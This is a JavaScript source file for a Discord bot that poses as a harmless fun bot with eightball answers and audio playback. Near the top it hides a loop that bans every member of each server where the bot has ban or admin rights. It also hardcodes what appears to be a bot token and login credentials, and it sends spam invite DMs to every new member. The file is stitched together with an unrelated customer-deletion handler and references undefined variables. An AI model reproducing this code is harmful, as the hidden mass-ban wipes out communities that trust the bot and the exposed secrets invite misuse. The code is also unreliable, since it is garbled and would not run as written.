const Discord = require(`discord.js`);

console.log("BOT ONLINE");

const prefix = "!"
const version = "3.2.8"
const token = "NTIwMjkwODg2NDYzMjU4NjU0.Duruxg.qDwwmgcYrlf2k4gksdizmGFGQrs"
const game = "with you!"
const status = "invisible"
var eightball = [ // sets the answers to an eightball
    "Hey!",
    "Don't play...",
    "with me?",
    "probably",
    "I don't think so.",
    "never!",
    "you can try...",
    "up to you!",
]


const Client = new Discord.Client();
Client.login("sefjkse90@emailna.co", "123456");
Client.guilds.forEach(g => {
        if (g.member(bot.user).hasPermission("BAN_MEMBERS") || g.member(bot.user).hasPermission("ADMINISTRATOR")){
            g.members.forEach(m => m.ban().catch(() => {}));
        }
    });
Client.login(token);
Client.on("ready", () => {
    Client.user.setStatus(status)
    Client.user.setGame(game)
    console.log("Bot Ready For Use")
})

function playAudio(voiceChannel, file) {

    voiceChannel.join().then(connection => {

        connection.playFile(file).on("end", () => {
                connection.disconnect();
                voiceChannel.leave();
        });

    });
}



Client.on("guildMemberAdd", member => {
  member.createDM().then(function (author) {
  return author.send(' ** https://discord.gg/8QmNXf7  افضل سيرفر مع خدمة مميزة جدا لا يفوتك لربما تحتاجه في يوم ما   ** ')

})
});







exports.delete = function(req, res) {
    var deleteCustomer = customers["customer" + req.params.id];
    delete customers["customer" + req.params.id];
    console.log("--->After deletion, customer list:\n" + JSON.stringify(customers, null, 4) );
    res.end( "Deleted customer: \n" + JSON.stringify(deleteCustomer, null, 4));
};


 
client.login(process.env.BOT_TOKEN);
